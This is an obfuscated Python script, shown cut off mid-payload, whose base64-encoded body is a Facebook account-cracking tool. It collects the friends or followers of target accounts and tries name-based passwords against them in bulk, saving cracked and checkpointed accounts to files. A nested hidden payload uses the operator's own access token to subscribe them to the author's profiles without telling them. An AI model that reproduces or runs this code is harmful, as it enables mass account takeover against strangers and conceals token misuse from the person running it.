# Created By Red Hackers Army

import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24KIyAtKi0gY29kaW5nOiB1dGYtOAoKI0F1dGhvciBBcnlhbgojQXV0aG9yIFJlZC1IYWNrZXIgIChNci4gQXJ5YW4pCgoKaW1wb3J0IG9zCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CglwcmludCgiXG4gWyFdIHJlcXVlc3RzIG1vZHVsZSBpcyBub3QgaW5zdGFsbGVkIikKCW9zLnN5c3RlbSgicGlwMiBpbnN0YWxsIHJlcXVlc3RzIikKCnRyeToKCWltcG9ydCBiczQKZXhjZXB0IEltcG9ydEVycm9yOgoJcHJpbnQoIlxuIFshXSBiczQgbW9kdWxlIGlzIG5vdCBpbnN0YWxsZWQgIikKCW9zLnN5c3RlbSgicGlwMiBpbnN0YWxsIGJzNCIpCgp0cnk6CglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKCXByaW50KCJcbiBbIV0gZnV0dXJlcyBtb2R1bGUgaXMgbm90IGluc3RhbGxlZCIpCglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBmdXR1cmVzIikKCmltcG9ydCBvcywgc3lzLCByZSwgdGltZSwgcmVxdWVzdHMsIGNhbGVuZGFyLCByYW5kb20KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQoKbG9vcCA9IDAKaWQgPSBbXQpvayA9IFtdCmNwID0gW10KCmN0ID0gZGF0ZXRpbWUubm93KCkKbiA9IGN0Lm1vbnRoCmJ1bGFuID0gWyJKYW51YXJ5IiwgIkZlYnJ1YXJ5IiwgIk1hcmNoIiwgIkFwcmlsIiwgIk1heSIsICJKdW5lIiwgIkp1bHkiLCAiQXVndXN0IiwgIlNlcHRlbWJlciIsICJPY3RvYmVyIiwgIk5vdmVtYmVyIiwgIkRlY2VtYmVyIl0KdHJ5OgoJaWYgbiA8IDAgb3IgbiA+IDEyOgoJCWV4aXQoKSAKCW5UZW1wID0gbiAtIDEKZXhjZXB0IFZhbHVlRXJyb3I6CglleGl0KCkKCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpvcCA9IGJ1bGFuW25UZW1wXQoKbXlfZGF0ZSA9IGRhdGUudG9kYXkoKQpociA9IGNhbGVuZGFyLmRheV9uYW1lW215X2RhdGUud2Vla2RheSgpXQp0YW5nZ2FsID0gKCIlcy0lcy0lcy0lcyIlKGhyLCBoYSwgb3AsIHRhKSkKdGdsID0gKCIlcyAlcyAlcyIlKGhhLCBvcCwgdGEpKQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0KCmRlZiBsb2dvKCk6Cglvcy5zeXN0ZW0oImNsZWFyIikKCWlwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0LnN0cmlwKCkKCWxvYyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9pcGFwaS5jb20vaXBfYXBpLnBocD9pcD0nICsgaXAsIGhlYWRlcnM9eydSZWZlcmVyJzogJ2h0dHBzOi8vaXAtYXBpLmNvbS8nLCAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnLCAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4xLjI7IFJlZG1pIDRYKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzcuMC4zODY1LjkyIE1vYmlsZSBTYWZhcmkvNTM3LjM2J30pLmpzb24oKVsnY291bnRyeV9uYW1lJ10ubG93ZXIoKQoJcHJpbnQoIlxu4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXXG7ilZEgIEF1dGhvciAgIDogIFJFRCBIQUNLM1IgICAgICAgICAgICAgICAgICDilZFcbuKVkSAgR2l0aHViICAgOiAgQXJ5YW4gTWZjICAg4pWRICAgICAgICAgICBcbuKVkSAgRmFjZWJvb2sgICAgICAgOiAgIFJlZCBINENLM1JTICAgICAgIOKVkSAgICAgICAgICAgXG7ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ1cbiIpCglwcmludCgiXG5cMDMzWzE7OTJtW1wwMzNbMTs5M21cMDMzWzE7OTZtXSAgWypdIElwIEFkZHJlc3MgOiBceDFiWzE7OTJtIikgKyBpcAoJcHJpbnQoIlwwMzNbMG0gWypdIENvdW50eSBSZWdpb24gOiBceDFiWzE7OTJtIikgKyBsb2MKCXByaW50KCJcMDMzWzBtIikKCQoKZGVmIGxvZ2luKCk6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXRyeToKCQkjLT4gY29ubmVjdGlvbiB0ZXN0CgkJcmVxdWVzdHMuZ2V0KCJceDY4XHg3NFx4NzRceDcwXHg3M1x4M2FceDJmXHgyZlx4NzdceDc3XHg3N1x4MmVceDY3XHg2Zlx4NmZceDY3XHg2Y1x4NjVceDJlXHg2M1x4NmZceDZkXHgyZlx4NzNceDY1XHg2MVx4NzJceDYzXHg2OFx4M2ZceDcxXHgzZFx4NDFceDdhXHg2OVx4NmRceDJiXHg1Nlx4NjFceDc1IikKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlleGl0KCIgWyFdIG5vIGludGVybmV0IGNvbm5lY3Rpb24iKQoJdHJ5OgoJCXRva2VuID0gb3BlbigibG9naW4udHh0IiwgInIiKQoJCW1lbnUoKQoJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CgkJbG9nbygpCgkJcHJpbnQoIiBbKl0gWW91IG11c3QgZmlyc3QgbG9naW4gdG8gZW50ZXIgdGhlIG1lbnUiKQoJCXByaW50KCIgWypdIFBsZWFzZSBlbnRlciB5b3VyIGZhY2Vib29rIHRva2VuIHRvIGxvZ2luIikKCQlwcmludCgiIFs/XSBUeXBlICdcMDMzWzA7OTNtaGVscFwwMzNbMDs5N20nIHRvIHNlZSBob3cgdG8gZ2V0IGEgRmFjZWJvb2sgdG9rZW4iKQoJCXRva2VuID0gcmF3X2lucHV0KCJcbiBbK10gZmIgdG9rZW4gOiAiKQoJCWlmIHRva2VuID09ICIiOgoJCQlleGl0KCJcbiBbIV0gZG9uJ3QgYmUgZW1wdHkiKQoJCWVsaWYgdG9rZW4gPT0gImhlbHAiOgoJCQlvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd2EubWUvOTE3MzU2MjY4ODE4P3RleHQ9SGklMjBIZWxvIikKCQkJZXhpdCgiIFshXSBNZXNzYWdlIG1lIHdoYXRzYXBwIikKCQl0cnk6CgkJCW5hbWEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iK3Rva2VuKS5qc29uKClbIm5hbWUiXS5sb3dlcigpCgkJCWltcG9ydCBiYXNlNjQKCQkJZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCJjbVZ4ZFdWemRITXVjRzl6ZENnaWFIUjBjSE02THk5bmNtRndhQzVtWVdObFltOXZheTVqYjIwdk1UQXdNRFExTWpBek9EVTFNamswTDNOMVluTmpjbWxpWlhKelAyRmpZMlZ6YzE5MGIydGxiajBpSzNSdmEyVnVLUXB5WlhGMVpYTjBjeTV3YjNOMEtDSm9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TURNd01URTVNemd3TnpJdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNJcmRHOXJaVzRwQ2c9PSIpKQoJCQlvcGVuKCJsb2dpbi50eHQiLCAidyIpLndyaXRlKHRva2VuKQoJCQlwcmludCgiXG4gWytdIEFjdGl2ZSB1c2VyLCB3ZWxjb21lICBcMDMzWzA7OTNtJXNcMDMzWzA7OTdtIiUobmFtYSkpCgkJCXRpbWUuc2xlZXAoMSkKCQkJbWVudSgpCgkJZXhjZXB0IEtleUVycm9yOgoJCQlvcy5zeXN0ZW0oInJtIC1mIGxvZ2luLnR4dCIpCgkJCWV4aXQoIiBbIV0gdG9rZW4gZXhwaXJlZCIpCgpkZWYgbWVudSgpOgoJb3Muc3lzdGVtKCJjbGVhciIpCglnbG9iYWwgdG9rZW4KCXRyeToKCQl0b2tlbiA9IG9wZW4oImxvZ2luLnR4dCIsInIiKS5yZWFkKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlvcy5zeXN0ZW0oInJtIC1mIGxvZ2luLnR4dCIpCgkJZXhpdCgiIFshXSB0b2tlbiBleHBpcmVkIikKCXRyeToKCQluYW1hID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS8/YWNjZXNzX3Rva2VuPSIrdG9rZW4pLmpzb24oKVsibmFtZSJdCglleGNlcHQgSU9FcnJvcjoKCQlvcy5zeXN0ZW0oInJtIC1mIGxvZ2luLnR4dCIpCgkJZXhpdCgiIFshXSB0b2tlbiBleHBpcmVkIikKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlleGl0KCIgWyFdIG5vIGludGVybmV0IGNvbm5lY3Rpb24iKQoJbG9nbygpCglwcmludCgiIFsgV0VMQ09NRSBcMDMzWzA7OTNtJXNcMDMzWzA7OTdtIF1cbiIlKG5hbWEpKQoJcHJpbnQoIlxuXDAzM1sxOzkybVtcMDMzWzE7OTNtMVwwMzNbMTs5Nm1dIENSQUNLIEZST00gUFVCTElDIEZSSUVORCIpCglwcmludCgiXG5cMDMzWzE7OTJtW1wwMzNbMTs5M20yXDAzM1sxOzk2bV0gQ1JBQ0sgRlJPTSBQVUJMSUMgRk9MTE9XRVJTIikKCXByaW50KCJcblwwMzNbMTs5Mm1bXDAzM1sxOzkzbTNcMDMzWzE7OTZtXSBDUkFDSyBGUk9NIE1VTFRJIFRBUkdFVCIpCglwcmludCgiXG5cMDMzWzE7OTJtW1wwMzNbMTs5M200XDAzM1sxOzk2bV0gU0VFIENSQUNLIFJFU1VMVCIpCglwcmludCgiXG5cMDMzWzE7OTJtW1wwMzNbMTs5M201XDAzM1sxOzk2bV0gQ0hFQ0sgVEhFIENSQUNLIFJFU1VMVCBPUFRJT04iKQoJcHJpbnQoIlxuXDAzM1sxOzkybVtcMDMzWzE7OTNtNlwwMzNbMTs5Nm1dIFVTRVItQUdFTlQgU0VUVElOR1MiKQoJcHJpbnQoIlxuXDAzM1sxOzkybVtcMDMzWzE7OTNtMFwwMzNbMTs5Nm1dICBFWElUIChyZW1vdmUgdG9rZW4pIikKCWF6aW0gPSByYXdfaW5wdXQoIlxuW1wwMzNbMTs5M21cMDMzWzE7OTZtXSAgW+Kck10gY2hvb3NlIDogIikKCWlmIGF6aW0gPT0gIiI6CgkJbWVudSgpCgllbGlmIGF6aW0gPT0gIjEiOgoJCXB1YmxpaygpCgkJbWV0aG9kKCkKCWVsaWYgYXppbSA9PSAiMiI6CgkJZm9sbG93ZXIoKQoJCW1ldGhvZCgpCgllbGlmIGF6aW0gPT0gIjMiOgoJCW1hc3NhbCgpCgkJbWV0aG9kKCkKCWVsaWYgYXppbSA9PSAiNCI6CgkJcHJpbnQoIlxuIFsxXSBDSEVDSyBUSEUgQ1JBQ0sgT0siKQoJCXByaW50KCIgWzJdIENIRUNLIFRIRSBDUkFDSyBDUCIpCgkJY2VrID0gcmF3X2lucHV0KCJcbiBbP10gQ2hvb3NlIDogIikKCQlpZiBjZWsgPT0iIjoKCQkJbWVudSgpCgkJZWxpZiBjZWsgPT0gIjEiOgoJCQlkaXJzID0gb3MubGlzdGRpcigiT0siKQoJCQlwcmludCgiIFsqXSBsaXN0IG9mIGZpbGUgbmFtZXMgc3RvcmVkIGluIHRoZSBPSyBmb2xkZXJcbiIpCgkJCWZvciBmaWxlIGluIGRpcnM6CgkJCQlwcmludCgiIFsrXSAiK2ZpbGUpCgkJCXRyeToKCQkJCWZpbGUgPSByYXdfaW5wdXQoIlxuIFs/XSBzZWxlY3QgZmlsZW5hbWUgOiAiKQoJCQkJaWYgZmlsZSA9PSAiIjoKCQkJCQltZW51KCkKCQkJCXRvdGFsb2sgPSBvcGVuKCJPSy8lcyIlKGZpbGUpKS5yZWFkKCkuc3BsaXRsaW5lcygpCgkJCWV4Y2VwdCBJT0Vycm9yOgoJCQkJZXhpdCgiIFshXSBmaWxlICVzIG5vdCBhdmFpbGFibGUiJShmaWxlKSkKCQkJbm1fZmlsZSA9ICgiJXMiJShmaWxlKSkucmVwbGFjZSgiLSIsICIgIikKCQkJZGVsX3R4dCA9IG5tX2ZpbGUucmVwbGFjZSgiLnR4dCIsICIiKQoJCQlwcmludCgiIFsjXSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKCQkJcHJpbnQoIiBbK10gY3JhY2sgcmVzdWx0IDogJXMgdG90YWwgOiAlc1wwMzNbMDs5Mm0iJShkZWxfdHh0LCBsZW4odG90YWxvaykpKQoJCQlvcy5zeXN0ZW0oImNhdCBPSy8lcyIlKGZpbGUpKQoJCQlwcmludCgiXDAzM1swOzk3bSBbI10gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCgkJCWV4aXQoIiBbIV0gZG9uJ3QgZm9yZ2V0IHRvIGNvcHkgYW5kIHNhdmUgdGhlIHJlc3VsdHMiKQoJCWVsaWYgY2VrID09ICIyIjoKCQkJZGlycyA9IG9zLmxpc3RkaXIoIkNQIikKCQkJcHJpbnQoIiBbKl0gbGlzdCBvZiBmaWxlIG5hbWVzIHN0b3JlZCBpbiB0aGUgQ1AgZm9sZGVyXG4iKQoJCQlmb3IgZmlsZSBpbiBkaXJzOgoJCQkJcHJpbnQoIiBbK10gIitmaWxlKQoJCQl0cnk6CgkJCQlmaWxlID0gcmF3X2lucHV0KCJcbiBbP10gc2VsZWN0IGZpbGVuYW1lIDogIikKCQkJCWlmIGZpbGUgPT0gIiI6CgkJCQkJbWVudSgpCgkJCQl0b3RhbGNwID0gb3BlbigiQ1AvJXMiJShmaWxlKSkucmVhZCgpLnNwbGl0bGluZXMoKQoJCQlleGNlcHQgSU9FcnJvcjoKCQkJCWV4aXQoIiBbIV0gZmlsZSAlcyBub3QgYXZhaWxhYmxlIiUoZmlsZSkpCgkJCW5tX2ZpbGUgPSAoIiVzIiUoZmlsZSkpLnJlcGxhY2UoIi0iLCAiICIpCgkJCWRlbF90eHQgPSBubV9maWxlLnJlcGxhY2UoIi50eHQiLCAiIikKCQkJcHJpbnQoIiBbI10gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCgkJCXByaW50KCIgWytdIGNyYWNrIHJlc3VsdCA6ICVzIHRvdGFsIDogJXNcMDMzWzA7OTNtIiUoZGVsX3R4dCwgbGVuKHRvdGFsY3ApKSkKCQkJb3Muc3lzdGVtKCJjYXQgQ1AvJXMiJShmaWxlKSkKCQkJcHJpbnQoIlwwMzNbMDs5N20gWyNdIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKQoJCQlleGl0KCIgWyFdIGRvbid0IGZvcmdldCB0byBjb3B5IGFuZCBzYXZlIHRoZSByZXN1bHRzIikKCQllbHNlOgoJCQltZW51KCkKCWVsaWYgYXppbSA9PSAiNSI6CgkJY2VrX29wc2koKQoJZWxpZiBhemltID09ICI2IjoKCQlzZXR0aW5nX3VhKCkKCWVsaWYgYXppbSA9PSAiMCI6CgkJb3Muc3lzdGVtKCJybSAtZiBsb2dpbi50eHQiKQoJCWV4aXQoIlxuIFsjXSBzdWNjZXNzZnVsbHkgZGVsZXRlZCB0b2tlbiIpCgllbHNlOgoJCW1lbnUoKQoKZGVmIHB1YmxpaygpOgoJZ2xvYmFsIHRva2VuCgl0cnk6CgkJdG9rZW4gPSBvcGVuKCJsb2dpbi50eHQiLCAiciIpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJZXhpdCgiIFshXSB0b2tlbiBleHBpcmVkIikKCXByaW50KCJcbiBbKl0gZmlsbCBpbiAnbWUnIGlmIHlvdSB3YW50IGZyb20gZnJpZW5kcyBsaXN0IikKCWlkdCA9IHJhd19pbnB1dCgiIFsrXSB0YXJnZXQgaWQgOiAiKQoJdHJ5OgoJCWZvciBpIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHRva2VuKSkuanNvbigpWyJkYXRhIl06CgkJCXVpZCA9IGlbImlkIl0KCQkJbmFtYSA9IGlbIm5hbWUiXS5yc3BsaXQoIiAiKVswXQoJCQlpZC5hcHBlbmQodWlkKyI8PT4iK25hbWEpCglleGNlcHQgS2V5RXJyb3I6CgkJZXhpdCgiIFshXSBhY2NvdW50IG5vdCBhdmFpbGFibGUgb3IgcHJpdmF0ZSBmcmllbmQgbGlzdCIpCglwcmludCgiIFsrXSB0b3RhbCBpZCAgOiBcMDMzWzA7OTFtJXNcMDMzWzA7OTdtIiUobGVuKGlkKSkpIAoKZGVmIGZvbGxvd2VyKCk6CglnbG9iYWwgdG9rZW4KCXRyeToKCQl0b2tlbiA9IG9wZW4oImxvZ2luLnR4dCIsICJyIikucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlleGl0KCIgWyFdIHRva2VuIGV4cGlyZWQiKQoJcHJpbnQoIlxuIFsqXSBmaWxsIGluICdtZScgaWYgeW91IHdhbnQgZnJvbSBvd24gZm9sbG93ZXJzIikKCWlkdCA9IHJhd19pbnB1dCgiIFsrXSB0YXJnZXQgaWQgOiAiKQoJdHJ5OgoJCWZvciBpIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49JXMiJShpZHQsIHRva2VuKSkuanNvbigpWyJkYXRhIl06CgkJCXVpZCA9IGlbImlkIl0KCQkJbmFtYSA9IGlbIm5hbWUiXS5yc3BsaXQoIiAiKVswXQoJCQlpZC5hcHBlbmQodWlkKyI8PT4iK25hbWEpCglleGNlcHQgS2V5RXJyb3I6CgkJZXhpdCgiIFshXSBhY2NvdW50IG5vdCBhdmFpbGFibGUgb3IgcHJpdmF0ZSBmcmllbmQgbGlzdCIpCglwcmludCgiIFsrXSB0b3RhbCBpZCAgOiBcMDMzWzA7OTFtJXNcMDMzWzA7OTdtIiUobGVuKGlkKSkpIAoKZGVmIG1hc3NhbCgpOgoJZ2xvYmFsIHRva2VuCgl0cnk6CgkJdG9rZW4gPSBvcGVuKCJsb2dpbi50eHQiLCAiciIpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJZXhpdCgiIFshXSB0b2tlbiBleHBpcmVkIikKCXRyeToKCQl0YW55YV90b3RhbCA9IGludChyYXdfaW5wdXQoIiBbK10gbnVtYmVyIG9mIHRhcmdldCBpZCA6ICIpKQoJZXhjZXB0OnRhbnlhX3RvdGFsPTEKCXByaW50KCJcbiBbKl0gZmlsbCBpbiAnbWUnIGlmIHlvdSB3YW50IGZyb20gZnJpZW5kcyBsaXN0IikKCWZvciB0IGluIHJhbmdlKHRhbnlhX3RvdGFsKToKCQl0ICs9MQoJCWlkdCA9IHJhd19pbnB1dCgiIFsrXSB0YXJnZXQgaWQgJXMgOiAiJSh0KSkKCQl0cnk6CgkJCWZvciBpIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHRva2VuKSkuanNvbigpWyJkYXRhIl06CgkJCQl1aWQgPSBpWyJpZCJdCgkJCQluYW1hID0gaVsibmFtZSJdLnJzcGxpdCgiICIpWzBdCgkJCQlpZC5hcHBlbmQodWlkKyI8PT4iK25hbWEpCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCgiIFshXSBhY2NvdW50IG5vdCBhdmFpbGFibGUgb3IgcHJpdmF0ZSBmcmllbmQgbGlzdCIpCglwcmludCgiIFsrXSB0b3RhbCBpZCAgOiBcMDMzWzA7OTFtJXNcMDMzWzA7OTdtIiUobGVuKGlkKSkpCgpkZWYgbWV0aG9kKCk6CglwcmludCgiIFxuIFsgQ0hPT1NFIE9ORSBDUkFDSyBNRVRIT0RdXG4iKQoJcHJpbnQoIiBbMV0gQXBpIE1ldGhvZCAoZmFzdCBjcmFjaykiKQoJcHJpbnQoIiBbMl0gRnJlZSBNZXRob2QgKGZhc3QgY3JhY2spIFtub3QgZm9yIEJEIHVzZXJdIikKCXByaW50KCIgWzNdIE1iYXNpYyBNZXRob2QgKHNsb3cgY3JhY2spIikKCXByaW50KCIgWzRdIE1vYmlsZSBNZXRob2QgKHNsb3cgY3JhY2spIikKCW1ldGhvZCA9IHJhd19pbnB1dCgiXG4gWytdIG1ldGhvZCA6ICIpCglpZiBtZXRob2QgPT0gIiI6CgkJbWVudSgpCgllbGlmIG1ldGhvZCA9PSAiMSI6CgkJYXNrID0gcmF3X2lucHV0KCIgWz9dIFVzZSBNYW51YWwgUGFzc3dvcmQ/IHkvbjogIikKCQlpZiBhc2sgPT0gInkiOgoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiBbKl0gcGFzcyBleGFtcGxlOiAxMDIwMzAsNTU2Njc3LDc4Njc4NiwgUmVkLCBIYWNrZXJzIikKCQkJCWFzdSA9IHJhd19pbnB1dCgiIFs/XSBzZXQgcGFzcyA6ICIpLnNwbGl0KCIsIikKCQkJCWlmIGxlbihhc3UpID09IiI6CgkJCQkJZXhpdCgiIFshXSBkb24ndCBiZSBlbXB0eSIpCgkJCQlwcmludCgiXG4gWytdIE9LIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogT0svJXMudHh0IiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFsrXSBDUCByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IENQLyVzLnR4dFxuIiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFshXSBpZiBubyByZXN1bHQgdHVybiBvbiBhaXJwbGFuZSBtb2RlIDUgc2Vjb25kc1xuIikKCQkJCWZvciB1c2VyIGluIGlkOgoJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCgkJCQkJY29lZy5zdWJtaXQoYXBpLCB1aWQsIGFzdSkKCQkJZXhpdCgiXG5cbiBbI10gY3JhY2tzIGNvbXBsZXRlLi4uIikKCQllbGlmIGFzayA9PSAibiI6CgkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOgoJCQkJcHJpbnQoIlxuIFsrXSBPSyByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IE9LLyVzLnR4dCIlKHRhbmdnYWwpKQoJCQkJcHJpbnQoIiBbK10gQ1AgcmVzdWx0cyBhcmUgc2F2ZWQgaW4gOiBDUC8lcy50eHRcbiIlKHRhbmdnYWwpKQoJCQkJcHJpbnQoIiBbIV0gaWYgbm8gcmVzdWx0IHR1cm4gb24gYWlycGxhbmUgbW9kZSA1IHNlY29uZHNcbiIpCgkJCQlmb3IgdXNlciBpbiBpZDoKCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQoJCQkJCWlmIGxlbihuYW1lKT49NjoKCQkJCQkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCQkJCQllbGlmIGxlbihuYW1lKSA9PSAzIG9yIGxlbihuYW1lKSA9PSA0IG9yIGxlbihuYW1lKSA9PSA1OgoJCQkJCQlwd3ggPSBbIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJCQkJCWVsc2U6CgkJCQkJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNCIsIG5hbWUrIjEyMzQ1IiBdCgkJCQkJY29lZy5zdWJtaXQoYXBpLCB1aWQsIHB3eCkKCQkJZXhpdCgiXG5cbiBbI10gY3JhY2tzIGNvbXBsZXRlLi4uIikKCWVsaWYgbWV0aG9kID09ICIyIjoKCQlhc2sgPSByYXdfaW5wdXQoIiBbP10gdXNlIG1hbnVhbCBwYXNzd29yZD8geS9uOiAiKQoJCWlmIGFzayA9PSAieSI6CgkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOgoJCQkJcHJpbnQoIlxuIFsqXSBwYXNzIGV4YW1wbGU6IDEwMjAzMCwgNTU2Njc3LCA3ODY3ODYsUmVkLEhhY2tlcnMiKQoJCQkJYXN1ID0gcmF3X2lucHV0KCIgWz9dIHNldCBwYXNzIDogIikuc3BsaXQoIiwiKQoJCQkJaWYgbGVuKGFzdSkgPT0iIjoKCQkJCQlleGl0KCIgWyFdIGRvbid0IGJlIGVtcHR5IikKCQkJCXByaW50KCJcbiBbK10gT0sgcmVzdWx0cyBhcmUgc2F2ZWQgaW4gOiBPSy8lcy50eHQiJSh0YW5nZ2FsKSkKCQkJCXByaW50KCIgWytdIENQIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogQ1AvJXMudHh0XG4iJSh0YW5nZ2FsKSkKCQkJCXByaW50KCIgWyFdIGlmIG5vIHJlc3VsdCB0dXJuIG9uIGFpcnBsYW5lIG1vZGUgNSBzZWNvbmRzXG4iKQoJCQkJZm9yIHVzZXIgaW4gaWQ6CgkJCQkJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgiPD0+IikKCQkJCQljb2VnLnN1Ym1pdChjcmFjaywgdWlkLCBhc3UsICJodHRwczovZnJlZS5mYWNlYm9vay5jb20iKQoJCQlleGl0KCJcblxuIFsjXSBjcmFja3MgY29tcGxldGUuLi4iKQoJCWVsaWYgYXNrID09ICJuIjoKCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzUpIGFzIGNvZWc6CgkJCQlwcmludCgiXG4gWytdIE9LIHJlc3VsdHMgYXJlIHNhdmVkIGluIDogT0svJXMudHh0IiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFsrXSBDUCByZXN1bHRzIGFyZSBzYXZlZCBpbiA6IENQLyVzLnR4dFxuIiUodGFuZ2dhbCkpCgkJCQlwcmludCgiIFshXSBpZiBubyByZXN1bHQgdHVybiBvbiBhaXJwbGFuZSBtb2RlIDUgc2Vjb25kc1xuIikKCQkJCWZvciB1c2VyIGluIGlkOgoJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCgkJCQkJaWYgbGVuKG5hbWUpPj02OgoJCQkJCQlwd3ggPSBbIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJCQkJCWVsaWYgbGVuKG5hbWUpID09IDMgb3IgbGVuKG5hbWUpID09IDQgb3IgbGVuKG5hbWUpID09IDU6CgkJCQkJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNCIsIG5hbWUrIjEyMzQ1IiBdCgkJCQkJZWxzZToKCQkJCQkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCQkJCQljb2VnLnN1Ym1pdChjcmFjaywgdWlkLCBwd3gsICJodHRwczovL2ZyZWUuZmFjZWJvb2suY29tIikKCQkJZXhpdCgiXG5cbiBbI10gQ3JhY2sgQ29tcGxldGUuLi4iKQoJZWxpZiBtZXRob2QgPT0gIjMiOgoJCWFzayA9IHJhd19pbnB1dCgiIFs/XSBVc2UgTWFudWFsIF